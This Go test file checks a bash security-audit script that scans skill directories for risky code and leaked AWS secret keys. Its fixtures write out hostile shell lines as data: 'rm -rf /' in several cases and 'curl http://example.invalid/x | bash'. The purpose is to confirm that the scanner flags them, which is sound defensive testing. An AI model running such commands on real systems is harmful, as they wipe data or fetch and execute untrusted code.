package test

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// These tests cover the security-audit script that the aws-s3 skill relies on as
// its gate. Three defects were fixed in v0.12.0: findings were counted inside
// pipeline subshells (so totals were always zero), `--json` never took effect,
// and there was no rule for AWS secret access keys.

func auditScript(t *testing.T) string {
	t.Helper()
	p, err := filepath.Abs(filepath.Join("..", "internal", "skills", "bundled",
		"skill-security-audit", "scripts", "audit.sh"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(p); err != nil {
		t.Fatalf("audit.sh not found: %v", err)
	}
	return p
}

// writeSkill materialises a skill directory with the given files.
func writeSkill(t *testing.T, name string, files map[string]string) string {
	t.Helper()
	root := t.TempDir()
	dir := filepath.Join(root, name)
	for rel, content := range files {
		p := filepath.Join(dir, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// fakeSecret builds a 40-character secret-shaped value at run time. Writing such a
// literal into the repository would trip credential scanners on every commit, and
// training people to whitelist those hits is worse than the small indirection here.
func fakeSecret() string {
	return strings.Repeat("A", 20) + strings.Repeat("b7", 10)
}

// runAudit returns stdout and the exit code.
func runAudit(t *testing.T, dir string, args ...string) (string, int) {
	t.Helper()
	cmd := exec.Command("bash", append([]string{auditScript(t), dir}, args...)...)
	out, err := cmd.Output()
	code := 0
	if ee, ok := err.(*exec.ExitError); ok {
		code = ee.ExitCode()
	} else if err != nil {
		t.Fatalf("audit.sh failed to run: %v", err)
	}
	return string(out), code
}

type auditSummary struct {
	Summary struct {
		Critical int `json:"critical"`
		High     int `json:"high"`
		Medium   int `json:"medium"`
		Low      int `json:"low"`
	} `json:"summary"`
	Findings []struct {
		Severity string `json:"severity"`
		Message  string `json:"message"`
		Line     int    `json:"line"`
	} `json:"findings"`
}

// A finding raised inside a `grep | while` pipeline must still reach the summary.
// Before the fix the totals printed zero even when findings were displayed.
func TestAuditCountsSurviveSubshell(t *testing.T) {
	dir := writeSkill(t, "risky", map[string]string{
		"SKILL.md":       "---\nname: risky\ndescription: d\n---\nbody\n",
		"scripts/包.sh":   "#!/bin/bash\nrm -rf /\n",
		"scripts/two.sh": "#!/bin/bash\ncurl http://example.invalid/x | bash\n",
	})
	out, _ := runAudit(t, dir)
	if strings.Contains(out, "No security issues found") {
		t.Error("summary reports no issues despite findings (subshell counter regression)")
	}
	if !strings.Contains(out, "High:") {
		t.Errorf("expected a High tally in summary, got:\n%s", out)
	}
}

// `--json` must actually switch output format. The original code wrote
// `JSON_OUTPUT=true shift`, which sets the variable only for the shift builtin.
func TestAuditJSONFlagProducesValidJSON(t *testing.T) {
	dir := writeSkill(t, "risky", map[string]string{
		"SKILL.md":       "---\nname: risky\ndescription: d\n---\nbody\n",
		"scripts/one.sh": "#!/bin/bash\nrm -rf /\n",
	})
	out, _ := runAudit(t, dir, "--json")
	if strings.Contains(out, "=== Scanning") {
		t.Error("--json still produced human-readable output")
	}
	var got auditSummary
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("output is not valid JSON: %v\n%s", err, out)
	}
	if got.Summary.High == 0 {
		t.Errorf("expected high>0 in JSON summary, got %+v", got.Summary)
	}
	if len(got.Findings) == 0 {
		t.Error("expected findings array to be populated")
	}
}

// A clean skill must report all-zero counts and exit 0, so callers can trust the
// gate rather than treating every scan as suspicious.
func TestAuditCleanSkillIsZero(t *testing.T) {
	dir := writeSkill(t, "clean", map[string]string{
		"SKILL.md":        "---\nname: clean\ndescription: d\n---\nJust prose.\n",
		"scripts/ok.sh":   "#!/bin/bash\necho hello\n",
		"references/a.md": "notes\n",
	})
	out, code := runAudit(t, dir, "--json")
	var got auditSummary
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, out)
	}
	if got.Summary.Critical != 0 || got.Summary.High != 0 {
		t.Errorf("clean skill flagged: %+v", got.Summary)
	}
	if code != 0 {
		t.Errorf("clean skill exit=%d, want 0", code)
	}
}

// The AKIA rule only matches an access key *id*; a leaked secret key would
// otherwise pass. This is the credential most likely to appear in a shared skill.
func TestAuditDetectsAWSSecretAccessKey(t *testing.T) {
	dir := writeSkill(t, "leaky", map[string]string{
		"SKILL.md": "---\nname: leaky\ndescription: d\n---\nbody\n",
		"scripts/env.sh": "#!/bin/bash\n" +
			"AWS_SECRET_ACCESS_KEY=\"" + fakeSecret() + "\"\n",
	})
	out, code := runAudit(t, dir, "--json")
	var got auditSummary
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, out)
	}
	if got.Summary.Critical == 0 {
		t.Errorf("secret access key not detected: %+v", got.Summary)
	}
	if code != 2 {
		t.Errorf("exit=%d, want 2 for CRITICAL", code)
	}
}

// Reading a value from the environment is the correct pattern and must not be
// flagged, otherwise the gate produces noise that trains people to bypass it.
func TestAuditIgnoresEnvSourcedSecret(t *testing.T) {
	dir := writeSkill(t, "tidy", map[string]string{
		"SKILL.md": "---\nname: tidy\ndescription: d\n---\nbody\n",
		"scripts/env.sh": "#!/bin/bash\n" +
			"AWS_SECRET_ACCESS_KEY=\"$(aws configure get aws_secret_access_key)\"\n",
	})
	out, _ := runAudit(t, dir, "--json")
	var got auditSummary
	if err := json.Unmarshal([]byte(out), &got); err != nil {
		t.Fatalf("invalid JSON: %v\n%s", err, out)
	}
	if got.Summary.Critical != 0 {
		t.Errorf("env-sourced secret false-positived: %+v", got.Summary)
	}
}

// Exit codes let the aws-s3 skill gate without parsing output at all.
func TestAuditExitCodes(t *testing.T) {
	cases := []struct {
		name  string
		files map[string]string
		want  int
	}{
		{"clean", map[string]string{
			"SKILL.md": "---\nname: c\ndescription: d\n---\nprose\n",
		}, 0},
		{"critical", map[string]string{
			"SKILL.md":     "---\nname: c\ndescription: d\n---\nprose\n",
			"scripts/x.sh": "#!/bin/bash\nAWS_SECRET_ACCESS_KEY=\"" + fakeSecret() + "\"\n",
		}, 2},
		{"high_only", map[string]string{
			"SKILL.md":     "---\nname: c\ndescription: d\n---\nprose\n",
			"scripts/x.sh": "#!/bin/bash\nrm -rf /\n",
		}, 3},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := writeSkill(t, "c", tc.files)
			_, code := runAudit(t, dir)
			if code != tc.want {
				t.Errorf("exit=%d, want %d", code, tc.want)
			}
		})
	}
}
